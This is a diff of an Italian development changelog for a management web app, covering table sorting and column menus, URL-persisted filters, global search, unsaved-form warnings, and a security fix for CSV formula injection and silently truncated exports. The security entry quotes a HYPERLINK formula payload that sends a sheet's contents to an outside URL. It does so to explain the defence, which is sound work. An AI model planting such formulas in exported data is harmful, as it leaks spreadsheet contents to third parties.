@@ -11,6 +11,178 @@ solo l'evoluzione del codice e dell'infrastruttura.
 
 ---
 
+## 2026-09-16 — Tabelle: ordinamento dalle intestazioni e menu "Colonne"; il cliente come link
+
+**Contesto.** Seconda parte della revisione dell'interfaccia (vedi la voce qui sotto): tre dei
+punti rimandati, scelti dopo.
+
+**Ordinamento cliccando l'intestazione.** Le liste di report, interventi e clienti si
+ordinavano solo dal menu "Ordina per", benché il server sapesse già farlo. Ora le colonne che
+il server sa ordinare hanno l'intestazione cliccabile, con una freccia: il primo clic usa il
+verso naturale della colonna (crescente per i nomi, decrescente per date e importi), il secondo
+lo inverte, e `aria-sort` dice a uno screen reader quale colonna è ordinata e come. Solo le
+colonne ordinabili sono cliccabili: un'intestazione che non fa niente al clic sarebbe peggio di
+una ferma. Le intestazioni scrivono lo stesso parametro `sort` del menu, che quindi resta
+allineato; il menu non sparisce, perché su mobile le intestazioni non ci sono. Colonne
+ordinabili: cliente, prezzo totale e data di creazione (report); cliente, data intervento,
+stato e data di creazione (interventi); nome e data di creazione (clienti). Lo stato degli
+interventi, che il server ordinava già ma il menu non offriva, entra anche nel menu: il verso
+decrescente dà programmati → in lavorazione → completati, l'ordine del lavoro. File:
+`entity-table.tsx` (`sortKey`, `defaultSortDirection`, `sort`, `onSortChange`),
+`lib/tableSort.ts`, le tre definizioni di colonne, le tre tabelle, le tre pagine.
+
+**Menu "Colonne".** I report hanno undici colonne, e su un portatile tenerle tutte vuol dire
+colonne strette e testo troncato. Accanto ai filtri c'è ora un menu per scegliere quali
+mostrare, ricordato per tabella in localStorage come le larghezze e le righe per pagina. Si
+salvano le colonne *nascoste*, così una colonna aggiunta in futuro compare da sola. Le colonne
+che identificano la riga (il cliente, il nome) sono nel menu ma bloccate (`hideable: false`).
+La scelta vale solo per la tabella: su mobile le righe sono schede con un loro sottoinsieme, e
+il menu lì non compare. Due aggiustamenti alle colonne ridimensionabili: una colonna che
+ricompare non ha una larghezza misurata, quindi la tabella si rimisura (le larghezze scelte
+dall'utente restano); e salvare il layout non cancella più le larghezze delle colonne nascoste.
+File: `column-visibility-menu.tsx`, `hooks/useHiddenColumns.ts`, `lib/theme.ts`,
+`useResizableColumns.ts`, i tre componenti dei filtri.
+
+**Il cliente come link.** Nelle schede di report e intervento il nome del cliente era testo:
+per arrivare ai suoi altri report bisognava tornare all'elenco clienti e cercarlo. Ora è un
+link alla sua scheda (e quindi si apre anche in un'altra scheda del browser). `DetailItem`
+accetta un contenuto qualunque, non solo testo. File: `customer-link.tsx`, `detail-item.tsx`,
+`ReportPage.tsx`, `InterventionPage.tsx`.
+
+**Test.** `entity-table.test.tsx` (intestazioni ordinabili, verso, `aria-sort`, colonne
+nascoste solo in tabella), `ReportsPage.test.tsx` (clic sull'intestazione scrive `sort` e
+aggiorna il menu; il menu "Colonne" nasconde, ricorda e ripristina),
+`useResizableColumns.test.tsx` (larghezze delle colonne nascoste), `detailPages.test.tsx` (link
+al cliente).
+
+---
+
+## 2026-09-16 — Interfaccia: liste che ricordano i filtri, link veri, ricerca globale, niente moduli persi
+
+**Contesto.** Revisione dell'interfaccia (lettura del codice, più la skill `ui-ux-pro-max`).
+Qui ci sono i punti scelti per primi; ordinamento, colonne e link al cliente sono nella voce
+sopra, il resto nel [BACKLOG](BACKLOG.md).
+
+**Filtri, ricerca e pagina nell'indirizzo.** Report, interventi, clienti e le quattro
+anagrafiche tenevano ricerca, ordinamento, date e pagina in `useState`: aprire una scheda e
+tornare indietro rimontava la lista da zero, e chi era a pagina 3 di una ricerca ripartiva da
+pagina 1 senza ricerca. Ora questi valori stanno nell'indirizzo (`?q=…&sort=…&from=…&to=…&page=…`,
+più `visibility`, `status` e `type` che la dashboard usava già), quindi resistono a "Indietro"
+e a un ricaricamento, e una vista filtrata si può mandare come link. Le scritture usano
+`replace` (cambiare filtro non allunga la cronologia). Ogni modifica diversa dalla pagina
+riporta alla prima nella stessa scrittura: prima lo faceva `useTablePagination` durante il
+render, ma l'indirizzo non si può scrivere durante il render, e il `setSearchParams` di React
+Router non accoda gli aggiornamenti, quindi due scritture separate si sovrascriverebbero. Il
+testo di ricerca resta nel componente mentre si scrive e va nell'indirizzo dopo la pausa di
+battitura: un campo controllato dall'indirizzo, che si aggiorna in modo asincrono, perde
+lettere. Per lo stesso motivo il debounce si è spostato dagli hook delle righe
+(`useReportsRows` e simili, `useSearchableRows`) a `useUrlSearchText`: con due debounce in
+fila l'attesa dopo ogni pausa sarebbe raddoppiata. I valori sconosciuti nell'indirizzo
+ricadono sui default. File: `hooks/useListUrlState.ts`, `ReportsPage`, `InterventionsPage`,
+`CustomersPage`, `simple-entity-page.tsx`, gli hook delle righe.
+
+**"Apri" e la barra laterale sono link.** Erano pulsanti che chiamavano `navigate`, quindi non
+funzionavano Ctrl+clic, il clic con la rotella e "Copia indirizzo link": in un gestionale dove
+si tengono due report affiancati è un limite reale. Ora `OpenEntityButton` è un `Link` con
+l'aspetto di un pulsante, e le voci della barra sono `Link` con `aria-current="page"` (la voce
+attiva prima si capiva solo dal colore). La documentazione è un vero `<a target="_blank">`.
+Gli indirizzi delle schede, scritti a mano in una dozzina di punti, stanno in
+`lib/entityPaths.ts`. Conseguenza: una scheda può essere la prima pagina di una scheda del
+browser, dove `navigate(-1)` non ha dove tornare. `useGoBack` porta allora all'elenco
+(React Router dà `key === "default"` alla prima voce che gestisce).
+
+**Dopo la creazione, un avviso invece di `window.confirm`.** "Report creato. Vuoi stamparlo
+adesso?" era la finestra del browser: aspetto diverso dal resto dell'app, pagina bloccata
+fino alla risposta, e nessun modo di aprire la scheda appena creata. Ora c'è un avviso
+"Report #123 creato" con **Apri** e **Stampa**, che dura 10 secondi (si ferma con il mouse
+sopra). La stampa parte dal clic, quindi il browser non blocca la finestra che apre. I dialoghi
+di creazione di report e intervento non mostrano più il proprio "creato con successo", che
+sarebbe stato un secondo avviso. File: `lib/createdToast.ts`, `DashboardPage`, `ReportsPage`,
+`InterventionsPage`, `createReportDialog.tsx`, `createInterventionDialog.tsx`.
+
+**Ricerca globale (Ctrl+K).** Nell'intestazione c'è un pulsante "Cerca…", che si apre anche con
+Ctrl+K (⌘K su Mac): una casella per clienti, report e interventi, più le pagine dell'app.
+Prima bisognava sapere in quale sezione cercare, e il numero di un report scritto su una
+ricevuta non si poteva digitare senza prima aprire la pagina Report. La ricerca usa le stesse
+API delle liste (stesse regole, compreso il numero esatto; il `#` davanti viene tolto): tre
+richieste in parallelo da cinque risultati, annullate se si continua a scrivere, e "Vedi tutti"
+porta alla lista con `?q=` già compilato. Parte da due lettere, o da un numero di qualunque
+lunghezza. Se un gruppo non risponde si mostrano gli altri, e l'avviso d'errore compare solo
+se non risponde nessuno. Nuova dipendenza: `cmdk` (la base del componente Command di shadcn,
+che gestisce navigazione da tastiera e ruoli ARIA); le sue dipendenze Radix c'erano già.
+File: `components/global-search.tsx`, `components/ui/command.tsx`, `MainLayout.tsx`.
+
+**Modifiche non salvate.** Nei dialoghi di creazione e modifica (report, interventi, clienti,
+anagrafiche) Esc o la X chiudevano subito, buttando via un modulo magari da venti campi. Ora
+`CustomDialog` accetta `isDirty`: se il modulo è diverso da com'era all'apertura, prima di
+chiudere chiede conferma, e il focus va su "Continua a modificare", così un Invio di troppo non
+perde niente. "Annulla" chiude senza chiedere, perché è già una scelta esplicita. Il confronto
+è per valore (`hasFormChanged`): scrivere e cancellare una lettera riporta il modulo "pulito".
+Nei dialoghi di modifica il riferimento sono i dati arrivati dal server, e durante il
+caricamento il modulo non risulta mai modificato. File: `customDialog.tsx`, `lib/formField.ts`,
+i nove dialoghi.
+
+**Pagine "non trovato".** Un indirizzo sconosciuto riportava in silenzio alla dashboard; una
+scheda con un id impossibile o cancellato mostrava un avviso che spariva da solo e tornava
+all'elenco. In entrambi i casi chi seguiva un link non capiva cosa fosse successo. Ora
+l'indirizzo resta com'è e la pagina dice "Pagina non trovata" o "Report non trovato", con un
+link all'elenco e alla dashboard. Il caso "non trovato" è solo il 404: gli altri errori di
+caricamento (rete, server) mantengono l'avviso e il ritorno all'elenco. File:
+`components/not-found-state.tsx`, `pages/NotFoundPage.tsx`, `App.tsx`, le cinque schede.
+
+**Grafico degli incassi.** Gli importi dei mesi si leggevano solo nel fumetto al passaggio del
+mouse, che su un telefono non c'è. Ora l'importo è scritto sopra ogni barra (le barre arrivano
+all'80% dell'altezza per lasciargli posto), la barra scelta ha `aria-pressed`, e sotto la cifra
+del mese c'è il confronto con il mese precedente ("+69% rispetto ad agosto 2026"), con freccia e
+segno oltre al colore. Il confronto non compare se il mese precedente non è nella serie (gli
+ultimi sei mesi) o vale zero. File: `DashboardPage.tsx`.
+
+**"Si" → "Sì".** Errore di accento nella lista report, nella scheda e nel dialogo di creazione.
+
+**Test.** Nuovi: `useListUrlState.test.tsx`, `useGoBack.test.tsx`, `global-search.test.tsx`, i
+casi "modifiche non salvate" in `entityDialogs.test.tsx`, lo stato nell'indirizzo in
+`ReportsPage.test.tsx`, il 404 in `detailPages.test.tsx`, il confronto in
+`DashboardPage.test.tsx`. Aggiornati quelli che cliccavano "Apri" aspettandosi `navigate`
+(ora controllano l'`href`), quelli di `window.confirm` e il debounce di `useSearchableRows`.
+Aiuto nuovo: `test/locationProbe.tsx` (con `test/currentLocation.ts`), che scrive l'indirizzo
+del router nella pagina.
+
+---
+
+## 2026-09-16 — Export CSV: niente formule eseguibili, niente file troncati in silenzio
+
+**Contesto.** Revisione di sicurezza del codice arrivato dopo l'audit del 2026-09-14 (skill
+`semgrep` di Trail of Bits, `npm audit`, lettura a mano). Semgrep e `npm audit` non hanno
+trovato nulla di nuovo (tre segnalazioni, tutte falsi positivi: il Dockerfile del backend "senza
+`USER`", che però scende a `node` con `su-exec` nell'entrypoint, e un file di test). I due
+problemi qui sotto sono emersi dalla lettura degli export CSV del 2026-09-15.
+
+**Formule nei CSV (CSV injection).** `escapeCsvField` gestiva solo virgole, virgolette e a-capo:
+un testo che iniziava con `=`, `+`, `-` o `@` usciva così com'era, ed Excel o LibreOffice lo
+eseguivano come formula — le virgolette non servono, vengono tolte prima. Note, nomi e
+descrizioni li scrive qualunque utente, il file lo apre di solito l'amministratore: una nota
+come `=HYPERLINK("https://…?d="&B2;"apri")` bastava a spedire altrove il contenuto del foglio.
+Lo stesso difetto, senza cattive intenzioni, rovinava i telefoni scritti `+39 333 …`, che il
+foglio leggeva come una formula sbagliata. Ora `toCsv` antepone un apostrofo ai testi che
+iniziano con uno di quei caratteri, con tab o con a-capo (la difesa raccomandata da OWASP).
+Restano intatti i numeri, anche quelli che Postgres restituisce come stringa (`numeric`, per
+esempio `-5.00`), altrimenti non sarebbero più sommabili. Costo accettato: in quelle celle
+l'apostrofo si vede. File: `csv.ts`, `csv.test.ts`.
+
+**Export troncati a 5000 righe senza avviso.** Le tre rotte `export.csv` chiamavano le liste
+senza paginazione, che si fermano al tetto di `takeUnpaginated` (5000 righe) con un solo
+warning nei log del server: "Esporta" prometteva l'archivio intero e consegnava un file che
+sembrava completo e non lo era. Ora `takeUnpaginated` accetta un `UnpaginatedLimit`: le
+schermate mantengono tetto e troncamento di prima, gli export passano `exportRowLimit` — 50.000
+righe e, oltre, un 400 che chiede di restringere i filtri (`ExportTooLargeError`). Il tetto
+resta perché il file si compone in memoria; 50.000 righe sono ben oltre i volumi del
+laboratorio e ancora qualche decina di MB nel caso peggiore. Il download parte da una
+navigazione del browser, quindi in quel caso l'errore compare come pagina JSON e non come
+toast: accettabile per un caso che oggi non si verifica. File: `pagination.ts`,
+`pagination.test.ts`, `report.ts`, `intervention.ts`, `customer.ts`, le tre rotte e i loro test.
+
+---
+
 ## 2026-09-16 — L'header colorato delle card di Impostazioni non arrivava all'angolo arrotondato
 
 **Cosa.** In `SettingsCard`
